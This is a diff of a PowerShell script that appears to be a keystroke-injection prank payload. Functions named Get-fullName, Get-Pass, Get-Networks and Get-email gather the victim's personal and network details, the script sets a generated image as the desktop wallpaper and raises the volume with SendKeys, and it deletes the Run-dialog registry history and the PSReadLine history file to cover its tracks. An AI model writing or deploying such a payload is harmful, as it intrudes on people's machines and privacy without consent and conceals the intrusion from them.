@@ -1,4 +1,3 @@
-
 function Get-fullName {
 
     try {
@@ -122,7 +121,7 @@ function Gen-Image {
     $graphics.Dispose() 
     $bmp.Save($filename) 
 
-    # Invoke-Item $filename
+    Invoke-Item $filename
 
 
     # Copy the image to the desktop
@@ -130,7 +129,7 @@ function Gen-Image {
     Copy-Item "C:\Users\Public\Documents\test.png" $newPath
 
     Write-Host "Image generated" -ForegroundColor Green
-    return $newPath
+    return "C:\Users\Public\Documents\test.png"
 }
 
 function Set-WallPaper {
@@ -188,7 +187,7 @@ public class Params
   
     $fWinIni = $UpdateIniFile -bor $SendChangeEvent
   
-    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
+    [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
 }
 
 function Get-email {
@@ -229,7 +228,7 @@ function Get-Days_Set {
     return $days
 }
 
-$s = New-Object -ComObject SAPI.SpVoice
+# $s = New-Object -ComObject SAPI.SpVoice
 
 $s.Rate = -1
 $days = Get-Days_Set
@@ -244,17 +243,16 @@ $passLength = $pass.Length
 
 # caps lock indicator light
 $blinks = 3; $o = New-Object -ComObject WScript.Shell; for ($num = 1 ; $num -le $blinks * 2; $num++) { $o.SendKeys("{CAPSLOCK}"); Start-Sleep -Milliseconds 250 }
-
+$k = [Math]::Ceiling(100 / 2); $o = New-Object -ComObject WScript.Shell; for ($i = 0; $i -lt $k; $i++) { $o.SendKeys([char] 175) }
 
 
 #-----------------------------------------------------------------------------------------------------------
 
 <#
-
 .NOTES 
-	Then the script will be paused until the mouse is moved 
+	Then the script will be paused until the mouse is moved
 	script will check mouse position every indicated number of seconds
-	This while loop will constantly check if the mouse has been moved 
+	This while loop will constantly check if the mouse has been moved
 	"CAPSLOCK" will be continously pressed to prevent screen from turning off
 	it will then sleep for the indicated number of seconds and check again
 	when mouse is moved it will break out of the loop and continue theipt
@@ -338,14 +336,13 @@ reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\
 
 Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 
-Remove-Item "C:\Users\Public\Documents\test.png"
+# Remove-Item "C:\Users\Public\Documents\test.png"
 
 Add-Type -AssemblyName System.Windows.Forms
 $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
 
 #If true, toggle CapsLock key, to ensure that the script doesn't fail
 if ($caps -eq $true) {
-
     $key = New-Object -ComObject WScript.Shell
     $key.SendKeys('{CapsLock}')
 }
@@ -358,7 +355,7 @@ if ($caps -eq $true) {
     Get-Pass
     Get-Networks
     Gen-Image
-    Set-WallPaper
+    Set-WallPaper    
     Get-email
     Get-Days_Set
 #>
